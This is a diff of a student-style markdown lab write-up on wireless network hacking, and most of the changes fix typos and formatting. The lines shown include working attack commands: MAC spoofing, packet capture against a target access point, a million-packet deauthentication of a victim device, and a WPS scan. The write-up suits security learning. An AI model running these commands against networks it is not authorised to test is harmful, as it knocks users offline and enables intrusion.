@@ -1,9 +1,9 @@
 # Network Hacking
 
 ## Objective
-To learn how malicious hackers hack a wired or wireless network and steal information for educational purpose. 
+To learn how malicious hackers hack wired or wireless network and steal information for educational purpose. 
 
-## Tool Used
+## Tools Used
 - Aircrack-NG
 - Crunch
 
@@ -12,7 +12,7 @@ To learn how malicious hackers hack a wired or wireless network and steal inform
 1. Bring down my machine interface to change the MAC address
    
 - ifconfig wlan0 down
-- ifconfig wlan0 hw ether *new mac address*
+- ifconfig wlan0 hw ether **new mac address**
 - ifconfig wlan0 up ✅
 
 2.Set my adapter to monitor mode
@@ -26,16 +26,16 @@ To learn how malicious hackers hack a wired or wireless network and steal inform
 3. Run airodump-ng to sniff and capture packets sent to and from the target access point
    
 - iwconfig
-- airodump-ng *int name*
+- airodump-ng **int name**
 - airodump-ng --band a wlan0
-- airodump-ng --bssid *value* --channel *value* --write *output file* wlan0  ✅
+- airodump-ng --bssid **value** --channel **value** --write **output file** wlan0  ✅
 
 4. Disconnect a device from the target network
 
-- aireplay-ng --deauth 1000000 -a *access point mac* -c *victim Mac* wlan0  ❌
+- aireplay-ng --deauth 1000000 -a **access point mac** -c **victim Mac** wlan0  ❌
 
 ## Gaining Access
-5. View all networks with WPS enabled:
+5. View all networks with WPS enabled
 - wash --interface wlan0 ✅
 ### Screenshot
 ![Wash command](../screenshots/wash-command.png)
@@ -83,5 +83,6 @@ The handshake will be received once the client reconnects
 
 ## What I Learned
 - How to identify Weak network and harden it
-- Importance of strong authentication is wireless network
+- Importance of strong authentication in wireless network
+- The need to segregate guest network from the main network
 
